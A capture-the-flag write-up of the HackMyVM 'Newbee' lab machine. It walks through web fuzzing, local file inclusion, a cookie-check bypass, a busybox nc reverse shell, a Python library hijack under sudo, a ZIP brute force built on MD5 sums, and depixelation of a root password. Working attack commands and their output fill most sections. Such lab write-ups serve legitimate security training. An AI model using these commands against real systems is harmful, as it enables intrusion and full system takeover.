# Newbee

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Newbee | hyh | Beginner | HackMyVM |

**Summary:** The exploitation of the Newbee virtual machine begins with a comprehensive web reconnaissance phase that identifies a hidden command execution interface. Initial access is achieved by discovering a local file inclusion vulnerability through a custom parameter, which allows for the retrieval of source code and the subsequent bypass of cookie based authentication. Once a reverse shell is established as the web user, lateral movement to the debian account is facilitated by a misconfigured sudo permission that permits the execution of a Python script within a world writable directory, enabling a library hijacking attack. The final stage involves the recovery of a root password stored within a pixelated image. By cracking a password protected ZIP archive using a brute force attack where the actual password is the MD5 sum of a key, the researcher extracts a pixelated PNG file. Utilizing the Depix tool to reverse the pixelation process reveals the cleartext credentials, leading to full administrative compromise of the system.

---

## Reconnaissance

The engagement begins with a standard network sweep to identify the target host and its available services. An initial ARP scan locates the machine, followed by a detailed service version detection scan.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/newbee]
└─$ nmap -sn 192.168.189.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-09 20:26 WIB
Nmap scan report for CLIENT-DESKTOP (192.168.189.1)
Host is up (0.00045s latency).
Nmap scan report for 192.168.189.128
Host is up (0.00097s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 6.25 seconds

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/newbee]
└─$ nmap -PR 192.168.189.128
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-09 20:26 WIB
Nmap scan report for 192.168.189.128
Host is up (0.0016s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.26 seconds

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/newbee]
└─$ nmap -sV -sC -p- 192.168.189.128 -T4
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-09 20:27 WIB
Nmap scan report for 192.168.189.128
Host is up (0.0018s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey:
|   256 92:6e:6d:b0:bd:08:1e:db:9d:56:0e:f8:15:25:ca:21 (ECDSA)
|_  256 88:d7:08:bd:a2:95:75:cc:71:06:47:ae:fd:d3:8b:b9 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: PHPJabbers.com | Free Food Store Website Template
|_http-server-header: Apache/2.4.62 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.18 seconds
```

The Nmap results reveal an Apache web server running on port 80 and an SSH service on port 22. A directory brute force attack is launched using feroxbuster to identify hidden files and directories.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/newbee]
└─$ feroxbuster -u http://192.168.189.128/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -x php,txt,html

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.189.128/
 🚩  In-Scope Url          │ 192.168.189.128
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, txt, html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      377l     1267w    18852c http://192.168.189.128/index.php
200      GET       37l      176w    10846c http://192.168.189.128/assets/images/features-first-icon.png
200      GET        6l       56w     2521c http://192.168.189.128/assets/images/line-dec.png
200      GET      282l      659w    12163c http://192.168.189.128/products.php
200      GET        2l       89w     4572c http://192.168.189.128/assets/js/scrollreveal.min.js
200      GET      179l      450w     7907c http://192.168.189.128/testimonials.php
200      GET        1l      233w    19796c http://192.168.189.128/assets/js/imgfix.min.js
200      GET     2445l    10688w    83672c http://192.168.189.128/assets/js/popper.js
200      GET        4l     1304w    83617c http://192.168.189.128/assets/js/jquery-2.1.0.min.js
200      GET      299l     1918w   146879c http://192.168.189.128/assets/images/blog-image-3-940x460.jpg
200      GET      155l      460w     6670c http://192.168.189.128/terms.php
301      GET        9l       28w      319c http://192.168.189.128/assets => http://192.168.189.128/assets/
200      GET     1273l     2562w    25037c http://192.168.189.128/assets/css/style.css
200      GET       50l      223w    17233c http://192.168.189.128/assets/fonts/Flaticon.woff
200      GET        4l       31w     2019c http://192.168.189.128/assets/fonts/flexslider-icon.woff
200      GET      205l     1266w   102931c http://192.168.189.128/assets/fonts/fontawesome-webfont.woff2
200      GET      349l     2050w   168182c http://192.168.189.128/assets/images/about-image-3-940x460.jpg
200      GET      284l     1610w   108068c http://192.168.189.128/assets/fonts/fontawesome-webfont.eot
200      GET      878l     6042w   453661c http://192.168.189.128/assets/images/blog-image-fullscren-1-1920x700.jpg
200      GET      761l     4798w   345428c http://192.168.189.128/assets/images/product-image-1-1200x600.jpg
200      GET      209l      639w     9782c http://192.168.189.128/blog.php
200      GET      216l      475w     8853c http://192.168.189.128/contact.php
200      GET      293l     2170w   166637c http://192.168.189.128/assets/images/product-2-720x480.jpg
200      GET      350l     2367w   169089c http://192.168.189.128/assets/images/about-image-1-940x460.jpg
301      GET        9l       28w      323c http://192.168.189.128/javascript => http://192.168.189.128/javascript/
200      GET      517l     3254w   299479c http://192.168.189.128/assets/images/product-1-720x480.jpg
200      GET    16582l    60225w   485937c http://192.168.189.128/assets/js/accordions.js
200      GET      100l      187w     2420c http://192.168.189.128/assets/js/custom.js
200      GET      262l      565w    10887c http://192.168.189.128/product-details.php
200      GET      453l     3072w   261854c http://192.168.189.128/assets/images/product-3-720x480.jpg
200      GET      319l     2087w   149263c http://192.168.189.128/assets/images/product-6-720x480.jpg
200      GET      512l     2909w   215535c http://192.168.189.128/assets/images/product-5-720x480.jpg
200      GET      303l      570w    13307c http://192.168.189.128/checkout.php
200      GET        8l       36w     1074c http://192.168.189.128/assets/js/jquery.counterup.min.js
200      GET        7l      662w    58078c http://192.168.189.128/assets/js/bootstrap.min.js
200      GET        8l      165w     8051c http://192.168.189.128/assets/js/waypoints.min.js
200      GET      193l      779w    10036c http://192.168.189.128/about.php
200      GET     2337l     3940w    39751c http://192.168.189.128/assets/css/font-awesome.css
200      GET      426l     2606w   190461c http://192.168.189.128/assets/images/blog-image-2-940x460.jpg
200      GET       18l      930w    89048c http://192.168.189.128/assets/js/mixitup.js
200      GET      236l      713w    11829c http://192.168.189.128/blog-details.php
200      GET        7l     1966w   155764c http://192.168.189.128/assets/css/bootstrap.min.css
200      GET        0l        0w        0c http://192.168.189.128/assets/nginx.htaccess
200      GET      393l     2411w   204116c http://192.168.189.128/assets/images/product-4-720x480.jpg
200      GET       14l      328w     2166c http://192.168.189.128/assets/fonts/slick.svg
200      GET        7l       50w     2083c http://192.168.189.128/assets/fonts/slick.ttf
200      GET      565l    45817w   313962c http://192.168.189.128/assets/fonts/fontawesome-webfont.svg
200      GET       32l       90w     2166c http://192.168.189.128/assets/fonts/flexslider-icon.ttf
200      GET       32l       91w     2362c http://192.168.189.128/assets/fonts/flexslider-icon.eot
200      GET       19l      162w     2352c http://192.168.189.128/assets/fonts/flexslider-icon.svg
200      GET        7l       38w     2217c http://192.168.189.128/assets/fonts/slick.woff
200      GET      472l     3048w   219690c http://192.168.189.128/assets/images/blog-image-1-940x460.jpg
200      GET      377l     1267w    18852c http://192.168.189.128/
200      GET      268l     1539w   129296c http://192.168.189.128/assets/fonts/fontawesome-webfont.woff
200      GET        9l       55w     2247c http://192.168.189.128/assets/fonts/slick.eot
200      GET     1779l     3428w   178406c http://192.168.189.128/assets/fonts/FontAwesome.otf
200      GET     1113l     4448w   156641c http://192.168.189.128/assets/fonts/fontawesome-webfont.ttf
200      GET      322l     1761w   119190c http://192.168.189.128/assets/images/about-image-2-940x460.jpg
200      GET    12117l    71244w  5619560c http://192.168.189.128/assets/images/video.mp4
200      GET      272l     1839w   173293c http://192.168.189.128/assets/images/contact-1-720x480.jpg
200      GET      189l     1457w   159559c http://192.168.189.128/assets/images/banner-image-1-1920x500.jpg
200      GET      325l     2422w   353155c http://192.168.189.128/assets/images/about-fullscreen-1-1920x700.jpg
200      GET       90l      161w     2187c http://192.168.189.128/secret.php
```

The scan identifies a page named secret.php. Navigating to this page displays a message indicating that the current user lacks administrative permissions to execute commands.

![](image.png)

## Vulnerability Discovery

Upon inspecting the source code of index.php, a suspicious comment is discovered that suggests the existence of a hidden parameter.

![](image-1.png)

A fuzzing attack is performed using ffuf to identify the correct parameter name.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/newbee]
└─$ ffuf -u "http://192.168.189.128/index.php?FUZZ=id" -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt -fs 18852

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.189.128/index.php?FUZZ=id
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 18852
________________________________________________

hack                    [Status: 200, Size: 18864, Words: 6832, Lines: 377, Duration: 32ms]
```

The parameter name is confirmed to be hack. This parameter is vulnerable to Local File Inclusion (LFI). Using the PHP filter wrapper, the source code of secret.php is retrieved in base64 format.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/newbee]
└─$ curl -s "http://192.168.189.128/index.php?hack=php://filter/convert.base64-encode/resource=secret.php" | tail -n 1 | sed 's/<!--.*//' | base64 -d
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>命令行控制台</title>
    <style>
        body {
            background-color: #1e1e1e;
            font-family: Consolas, monospace;
            color: #fff;
            margin: 0;
            padding: 0;
        }

        .console {
            width: 80%;
            margin: 50px auto;
            padding: 20px;
            background-color: #000;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
            height: 400px;
            overflow-y: auto;
            font-size: 16px;
        }

        .output {
            white-space: pre-wrap;
            margin-bottom: 10px;
        }

        .input-container {
            display: flex;
            align-items: center;
        }

        .input-container .prompt {
            color: #00ff00;
            margin-right: 5px;
        }

        .input-container input {
            background: transparent;
            border: none;
            color: #fff;
            width: 100%;
            padding: 5px;
            font-size: 16px;
            outline: none;
        }

        .input-container input:focus {
            border: 1px solid #00ff00;
        }

        .input-container input::placeholder {
            color: #888;
        }

        .console-footer {
            padding-top: 10px;
            color: #888;
            font-size: 12px;
            text-align: center;
        }
    </style>
</head>
<body>

<div class="console">
    <div class="output" id="output">
        <?php

        if (isset($_COOKIE['AreYouAdmin']) && $_COOKIE['AreYouAdmin'] === 'Yes') {

            if (isset($_GET['command'])) {
                $command = $_GET['command'];
                $output = shell_exec($command);
                echo '<div>\> ' . htmlspecialchars($command) . '</div>';
                echo '<div>' . nl2br(htmlspecialchars($output)) . '</div>';
            }
        } else {
            echo '<div>No permission to execute commands, lacking admin permission.</div>';
        }
        ?>
    </div>

    <div class="input-container">
        <span class="prompt">\></span>
        <form method="get">
            <input type="text" name="command" id="input" placeholder="command..." autocomplete="off">
        </form>
    </div>
</div>

<script>
    const inputField = document.getElementById("input");

    inputField.focus();
</script>

</body>
</html>
```

## Exploitation

The source code reveals that command execution is possible if a cookie named AreYouAdmin is set to Yes. By supplying this cookie, Remote Command Execution (RCE) is achieved.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/newbee]
└─$ curl -s -b "AreYouAdmin=Yes" "http://192.168.189.128/secret.php?command=id" | grep id
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
            width: 80%;
            width: 100%;
            border: 1px solid #00ff00;
    <div class="output" id="output">
        <div>\> id</div><div>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br />
            <input type="text" name="command" id="input" placeholder="command..." autocomplete="off">
```

To gain an interactive shell, a listener is started on the local machine and a busybox reverse shell payload is executed.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/newbee]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/newbee]
└─$ curl -s -b "AreYouAdmin=Yes" "http://192.168.189.128/secret.php?command=busybox%20nc%20192.168.189.1%204444%20-e%20%2Fbin%2Fbash"
```

The shell is successfully received and stabilized for better interaction.

```bash
connect to [172.20.131.21] from (UNKNOWN) [172.20.128.1] 56129
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@Newbee:/var/www/html/shop$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/newbee]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

www-data@Newbee:/var/www/html/shop$ export SHELL=/bin/bash
www-data@Newbee:/var/www/html/shop$ export TERM=xterm-256color
www-data@Newbee:/var/www/html/shop$ stty rows 75 cols 115
www-data@Newbee:/var/www/html/shop$
```

## Internal Enumeration

With a stable shell as the www-data user, the researcher examines the environment for lateral movement opportunities. Initial system enumeration is performed to identify users and the structure of the home directory.

```bash
www-data@Newbee:/var/www/html/shop$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
debian:x:1000:1000:Debian,,,:/home/debian:/bin/bash
www-data@Newbee:/var/www/html/shop$ ls -la /home/
total 28
drwxr-xr-x  4 root   root    4096 Jul 11  2023 .
drwxr-xr-x 18 root   root    4096 Mar  6  2025 ..
drwx------  5 debian debian  4096 Mar 25  2025 debian
drwx------  2 root   root   16384 Jul 11  2023 lost+found
```

A check of sudo permissions reveals that www-data can run a specific Python script as the debian user without a password.

```bash
www-data@Newbee:/var/www/html/shop$ sudo -l
sudo: unable to resolve host Newbee: Temporary failure in name resolution
Matching Defaults entries for www-data on Newbee:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    targetpw, use_pty

User www-data may run the following commands on Newbee:
    (debian) NOPASSWD: /usr/bin/python3 /var/www/html/vuln.py
```

The script vuln.py is inspected to understand its functionality. It imports several standard libraries, including random.

```bash
www-data@Newbee:/var/www/html/shop$ cd ..
www-data@Newbee:/var/www/html$ ls -la vuln.py
-rwxr-xr-x 1 root root 1086 Mar  8  2025 vuln.py
www-data@Newbee:/var/www/html$ cat vuln.py
import random
import time
import math
import string
import datetime

def generate_random_string(length=10):

    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def pointless_computation():

    number = random.randint(1, 1000)
    result = math.sqrt(number) * math.log(number)
    print(f"Calculated math nonsense: sqrt({number}) * log({number}) = {result}")

def simulate_time_wasting():

    now = datetime.datetime.now()
    print(f"Started wasting time at {now}")
    time.sleep(2)  # 故意睡眠 2 秒
    later = datetime.datetime.now()
    print(f"Finished wasting time at {later}. Time wasted: {later - now}")

def pointless_string_operations():

    rand_str = generate_random_string()
    print(f"Generated random string: {rand_str}")
    reversed_str = rand_str[::-1]
    print(f"Reversed string: {reversed_str}")
    print(f"String length: {len(rand_str)}")

if __name__ == "__main__":
    pointless_computation()
    simulate_time_wasting()
    pointless_string_operations()
    print("All done. The script accomplished nothing useful.")
```

Since the parent directory /var/www/html is world writable, a library hijacking attack is possible by creating a malicious random.py in the same directory.

```bash
www-data@Newbee:/var/www/html$ ls -la .
total 20
drwxrwxrwx 4 root     root     4096 Mar  8  2025 .
drwxr-xr-x 3 root     root     4096 Mar  6  2025 ..
-rw-r--r-- 1 root     root        0 Mar  6  2025 .htaccess
drwxr-xr-x 3 root     root     4096 Mar  8  2025 flask
drwxr-xr-x 3 www-data www-data 4096 Mar  7  2025 shop
-rwxr-xr-x 1 root     root     1086 Mar  8  2025 vuln.py
```

```bash
www-data@Newbee:/var/www/html$ echo 'import os; os.system("/bin/bash")' > /var/www/html/random.py
www-data@Newbee:/var/www/html$ sudo -u debian /usr/bin/python3 /var/www/html/vuln.py
debian@Newbee:/var/www/html$ id
uid=1000(debian) gid=1000(debian) groups=1000(debian),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
```

As the debian user, further enumeration of the home directory reveals several interesting files, including a note, a database configuration, and a hidden .secret folder.

```bash
debian@Newbee:/var/www/html$ cd
debian@Newbee:~$ ls -la
total 60
drwx------ 5 debian debian 4096 Mar 25  2025 .
drwxr-xr-x 4 root   root   4096 Jul 11  2023 ..
-rw-r--r-- 1 root   root      0 Mar  7  2025 .bash_history
-rw-r--r-- 1 debian debian  220 Mar  7  2025 .bash_logout
-rw-r--r-- 1 debian debian 3526 Jul 11  2023 .bashrc
drwx------ 3 debian debian 4096 Mar  6  2025 .gnupg
-rw------- 1 debian debian  119 Mar 25  2025 .mysql_history
-rw-r--r-- 1 debian debian  807 Jul 11  2023 .profile
drwxr-xr-x 2 root   root   4096 Mar 25  2025 .secret
drwxr-xr-x 2 debian debian 4096 Mar  8  2025 .ssh
-rw------- 1 debian debian 9049 Mar  6  2025 .viminfo
-rw-r--r-- 1 root   root    151 Mar  6  2025 config.php
-rw-r--r-- 1 root   root    120 Mar  6  2025 note.txt
-rw-r--r-- 1 debian debian   33 Mar  6  2025 user.txt
```

The note and configuration files are examined for credentials or hints.

```bash
debian@Newbee:~$ cat note.txt
Damn it, I forgot my database password. I heard that Debian is currently building a message board, maybe he can help me
debian@Newbee:~$ cat config.php
<?php
$servername = "localhost";
$username = "root";
$password = "


$conn = new mysqli($servername, $username, $password);

............
............
```

The .mysql_history file provides clues about previous database activity.

```bash
debian@Newbee:~$ cat .mysql_history
_HiStOrY_V2_
show\040tables;
show\040databases;
select\040*\040from\040user;
use\040user;
select\040*\040from\040user;
```

Inside the .secret folder, a hint.txt and a password.zip file are found.

```bash
debian@Newbee:~$ cat .secret/
hint.txt      password.zip
debian@Newbee:~$ cat .secret/hint.txt
password is md5(key)

and key is in mysql!!!!!!
```

The password.zip file is verified as a valid archive.

```bash
debian@Newbee:~$ file .secret/password.zip
.secret/password.zip: Zip archive data, at least v1.0 to extract, compression method=store
```

The password.zip file is transferred to the attacker's machine for cracking.

```bash
debian@Newbee:~$ cd .secret/
debian@Newbee:~/.secret$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/newbee]
└─$ wget http://192.168.189.128:8080/password.zip
--2026-05-09 21:13:57--  http://192.168.189.128:8080/password.zip
Connecting to 192.168.189.128:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 758 [application/zip]
Saving to: ‘password.zip’

password.zip      100%[==========>]     758  --.-KB/s    in 0s

2026-05-09 21:13:57 (2.23 MB/s) - ‘password.zip’ saved [758/758]
```

A brute force attack is conducted against the zip archive by calculating the MD5 hash of each entry in the rockyou.txt wordlist and using that hash as the password for decryption.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/newbee]
└─$ while read -r key; do hash=$(echo -n "$key" | md5sum | awk '{print $1}'); unzip -P "$hash" -t password.zip &>/dev/null && echo "DONE! Key: $key | MD5: $hash" && break; done < /usr/share/wordlists/rockyou.txt
DONE! Key: 1qaz2wsx | MD5: 1c63129ae9db9c60c3e8aa94d3e00495
```

The ZIP is decrypted using the discovered MD5 sum, revealing a file named password.png.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/newbee]
└─$ unzip password.zip
Archive:  password.zip
[password.zip] password.png password:
 extracting: password.png

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/newbee]
└─$ file password.png
password.png: PNG image data, 205 x 15, 8-bit/color RGBA, non-interlaced
```

The image is heavily pixelated.

![](image-2.png)

## Privilege Escalation

To recover the root password, the researcher uses the Depix tool to depixelate the image.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/newbee]
└─$ depix -p password.png -s /opt/Depix/images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o p.png
2026-05-09 21:41:02,354 - Loading pixelated image from password.png
2026-05-09 21:41:02,377 - Loading search image from /opt/Depix/images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png
2026-05-09 21:41:03,530 - Finding color rectangles from pixelated space
2026-05-09 21:41:03,536 - Found 116 same color rectangles
2026-05-09 21:41:03,537 - 86 rectangles left after moot filter
2026-05-09 21:41:03,537 - Found 1 different rectangle sizes
2026-05-09 21:41:03,538 - Finding matches in search image
2026-05-09 21:41:03,538 - Scanning 86 blocks with size (5, 5)
2026-05-09 21:41:03,570 - Scanning in searchImage: 0/1674
2026-05-09 21:41:42,273 - Removing blocks with no matches
2026-05-09 21:41:42,273 - Splitting single matches and multiple matches
2026-05-09 21:41:42,280 - [10 straight matches | 76 multiple matches]
2026-05-09 21:41:42,281 - Trying geometrical matches on single-match squares
2026-05-09 21:41:42,772 - [31 straight matches | 55 multiple matches]
2026-05-09 21:41:42,772 - Trying another pass on geometrical matches
2026-05-09 21:41:45,596 - [36 straight matches | 50 multiple matches]
2026-05-09 21:41:45,596 - Writing single match results to output
2026-05-09 21:41:45,597 - Writing average results for multiple matches to output
2026-05-09 21:41:47,386 - Saving output image to: p.png
```

The resulting image clearly displays the root password: hellofromtheotherside.

![](image-3.png)

The researcher authenticates as root and retrieves the final flags.

```bash
debian@Newbee:~/.secret$ su - root
Password:
root@Newbee:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
Newbee
root@Newbee:~# cat /home/debian/user.txt
ed2[REDACTED]
root@Newbee:~# cat /root/root.txt
c18[REDACTED]
```

---

## Attack Chain Summary
1. **Reconnaissance**: Scanning revealed a web server with a hidden secret.php page and a hint in the index.php source code.
2. **Vulnerability Discovery**: Fuzzing identified the hack parameter, which was exploited via PHP filters to read source code and bypass cookie checks.
3. **Exploitation**: Remote Command Execution was achieved through the command parameter, leading to a stable reverse shell as www-data.
4. **Internal Enumeration**: Library hijacking on a world writable directory allowed elevation to the debian user via a sudo misconfiguration.
5. **Privilege Escalation**: A ZIP archive was cracked using the MD5 hash of a key to reveal a pixelated image, which was then depixelated with Depix to recover the root password.

